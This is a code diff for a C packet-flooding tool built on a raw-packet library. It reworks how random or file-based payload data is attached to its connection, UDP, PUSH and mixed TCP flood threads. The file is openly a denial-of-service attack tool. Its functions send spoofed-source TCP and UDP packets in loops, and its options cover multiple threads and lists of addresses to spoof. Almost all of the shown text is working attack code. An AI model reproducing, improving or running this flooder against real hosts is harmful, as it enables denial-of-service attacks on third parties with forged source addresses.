@@ -43,13 +43,25 @@ uint8_t *send_data = NULL;
 int send_data_size = 0;
 int quiet = 0;
 int use_tcp_options = 0;
-uint8_t *additional_data = NULL;
-int additional_data_size = 0;
+int fill_data_with_random = 0;
 
 
 /* handle term signals */
 void signal_handler(int sig) {
     running = 0;
+}
+
+uint8_t *get_send_data()
+{
+    int i;
+    if(send_data_size > 0) {
+        if(fill_data_with_random) {
+            for(i=0;i<send_data_size;++i)
+                send_data[i] = leef_random_byte();
+        }
+        return send_data;
+    }
+    return NULL;
 }
 
 /* spoofing utilities */
@@ -109,7 +121,6 @@ void conn_flood_sniff_thread()
     uint32_t ack_seq;
     uint32_t lastTicks;
     uint32_t ticksNow;
-    int i;
     int syn_sent = 0;
     int synack_received = 0;
     int rst_received = 0;
@@ -181,26 +192,15 @@ void conn_flood_sniff_thread()
                     seq = packet.in_ip.tcp->ack_seq;
                     ack_seq = packet.in_ip.tcp->seq + 1;
 
-                    if(send_data_size) {
+                    if(send_data_size > 0) {
                         leef_send_raw_tcp2(&leef,
                                            interface_addr, dest_addr,
                                            src_port, dest_port,
                                            id, seq, ack_seq,
                                            TCP_ACK | TCP_PUSH,
                                            send_data_size,
-                                           send_data);
+                                           get_send_data());
                         tx_bytes += 54 + send_data_size;
-                    } else if(additional_data_size) {
-                        for(i=0;i<additional_data_size;++i)
-                            additional_data[i] = leef_random_byte();
-                        leef_send_raw_tcp2(&leef,
-                                           interface_addr, dest_addr,
-                                           src_port, dest_port,
-                                           id, seq, ack_seq,
-                                           TCP_ACK | TCP_PUSH,
-                                           additional_data_size,
-                                           additional_data);
-                        tx_bytes += 54 + additional_data_size;
                     } else {
                         leef_send_tcp_ack(&leef,
                                           interface_addr, dest_addr,
@@ -365,18 +365,15 @@ void *ack_flood_attack_thread(void *param)
 void *udp_flood_attack_thread(void *param)
 {
     struct leef_handle leef;
-    int i;
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
     while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
-        for(i=0;i<additional_data_size;++i)
-            additional_data[i] = leef_random_byte();
         leef_send_udp_data(&leef,
                            get_src_ip(), dest_addr,
                            leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                            leef_random_u16(),
-                           additional_data_size, additional_data);
+                           send_data_size, get_send_data());
         if(sleep_interval)
             usleep(sleep_interval);
     }
@@ -389,7 +386,6 @@ void *udp_flood_attack_thread(void *param)
 /* MIX flood */
 void *mix_flood_attack_thread(void *param)
 {
-    int i;
     struct leef_handle leef;
     if(!leef_init(&leef, INJECTING))
         return NULL;
@@ -410,14 +406,12 @@ void *mix_flood_attack_thread(void *param)
                                 leef_random_u16(), leef_random_u32(), leef_random_u32());
                 break;
             case 2: /* PUSH + ACK */
-                for(i=0;i<additional_data_size;++i)
-                    additional_data[i] = leef_random_byte();
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
                                 leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                 TCP_PUSH | TCP_ACK,
-                                additional_data_size, additional_data);
+                                send_data_size, get_send_data());
             case 3: /* FIN + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
@@ -439,7 +433,6 @@ void *mix_flood_attack_thread(void *param)
 /* MIX2 flood */
 void *mix2_flood_attack_thread(void *param)
 {
-    int i;
     struct leef_handle leef;
     if(!leef_init(&leef, INJECTING))
         return NULL;
@@ -453,14 +446,12 @@ void *mix2_flood_attack_thread(void *param)
                                 leef_random_u16(), leef_random_u32(), leef_random_u32());
                 break;
             case 1: /* PUSH + ACK */
-                for(i=0;i<additional_data_size;++i)
-                    additional_data[i] = leef_random_byte();
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
                                 leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                 TCP_PUSH | TCP_ACK,
-                                additional_data_size, additional_data);
+                                send_data_size, get_send_data());
             case 2: /* FIN + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
@@ -482,20 +473,17 @@ void *mix2_flood_attack_thread(void *param)
 /* PUSH flood */
 void *push_flood_attack_thread(void *param)
 {
-    int i;
     struct leef_handle leef;
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
     while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
-        for(i=0;i<additional_data_size;++i)
-            additional_data[i] = leef_random_byte();
         leef_send_raw_tcp2(&leef,
                         get_src_ip(), dest_addr,
                         leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                         leef_random_u16(), leef_random_u32(), leef_random_u32(),
                         TCP_PUSH | TCP_ACK,
-                                additional_data_size, additional_data);
+                        send_data_size, get_send_data());
     }
 
     leef_terminate(&leef);
@@ -619,15 +607,13 @@ void print_help(char **argv)
     printf("  -t [time]         - Run time in seconds (default: infinite)\n");
     printf("  -u [interval]     - Sleep interval in microseconds (default: 10000)\n");
     printf("  -b [bytes]        - Additional random bytes to send as data (default: 0)\n");
+    printf("  -m [threads]      - Number of send threads (default: 1)\n");
+    printf("  -d [binary file]  - Send binary file as data\n");
     printf("  -s [ip]           - Use a custom source address\n");
+    printf("  -f [text file]    - Read a list of IPs from a text file for spoofing\n");
     printf("  -q                - Quiet, don't print statistics output\n");
     printf("  -o                - Enable tcp options on SYN packets\n");
     printf("  --help            - Print this help\n");
-    printf("Connection flood options:\n");
-    printf("  -d [binary file]  - Send binary file as data\n");
-    printf("SYN/ACK/UDP flood options:\n");
-    printf("  -m [threads]      - Number of send threads (default: 1)\n");
-    printf("  -f [text file]    - Read a list of IPs from a text file for spoofing\n");
 }
 
 int main(int argc, char **argv)
@@ -781,8 +767,9 @@ int main(int argc, char **argv)
                     use_tcp_options = 1;
                     break;
                 case 'b':
-                    additional_data_size = atoi(argv[++arg]);
-                    additional_data = (uint8_t *)malloc(additional_data_size);
+                    send_data_size = atoi(argv[++arg]);
+                    send_data = (uint8_t *)malloc(send_data_size);
+                    fill_data_with_random = 1;
                     break;
                 default:
                     fprintf(stderr, "incorrect option %s, see --help\n", opt);
@@ -877,11 +864,13 @@ int main(int argc, char **argv)
         pthread_join(threads[i], NULL);
 
     /* cleanup */
+    free(threads);
+
     if(spoof_addresses)
         free(spoof_addresses);
 
-    if(additional_data)
-        free(additional_data);
+    if(send_data)
+        free(send_data);
     return 0;
 }
 
